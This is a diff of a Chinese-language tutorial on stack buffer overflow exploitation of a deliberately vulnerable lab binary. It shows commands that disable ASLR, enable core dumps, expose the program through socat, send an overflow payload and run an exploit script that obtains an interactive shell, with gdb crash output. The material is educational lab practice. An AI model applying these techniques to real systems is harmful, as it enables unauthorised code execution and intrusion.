@@ -9,7 +9,7 @@
 2. pwntools(py的库函数，安装方法见https://www.cnblogs.com/pcat/p/5451780.html ）<br>
 3. objdump <br>
 4. ROPgadget<br>
-
+5. socat挂载程序<br><br>
 ## linux_84
 ### Control Flow Hijack 程序流劫持
 $ gcc -fno-stack-protector -z execstack  -m32 -o level1 level1.c<br>
@@ -39,8 +39,31 @@ Program terminated with signal SIGSEGV, Segmentation fault.<br>
 0xffffd000:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
 0xffffd099:	""<br>
 $ python exp1.py<br>
-$ python exp1.py<br>
 [+] Starting local process './level1': pid 14146<br>
+[*] Switching to interactive mode<br>
+$ whoami<br>
+[用户名] <br><br>
+
+### 如何进行远程调试
+关闭地址随机化<br>
+$ sudo -s<br>
+$ echo 0 > /proc/sys/kernel/randomize_va_space<br>
+$ exit<br>
+得到core文件方便gdb调试<br>
+$ ulimit -c unlimited<br>
+$ sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'<br>
+进行socat挂载程序：<br>
+socat TCP4-LISTEN:2008,fork EXEC:./level1<br>
+开启另一终端：<br>
+ABCDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+$ gdb level1 /tmp/core.1545029325<br>
+Program terminated with signal SIGSEGV, Segmentation fault.<br>
+#0  0x41414141 in ?? ()<br>
+(gdb) x/10s $esp -144<br>
+0xffffcf50:	"ABCD", 'A' <repeats 140 times>, "\nS\373\367\260\320\377\377"<br>
+将python程序设置到remote模式后：<br>
+$ python exp1.py<br>
+[+] Opening connection to 127.0.0.1 on port 2008: Done<br>
 [*] Switching to interactive mode<br>
 $ whoami<br>
 [用户名] <br><br>
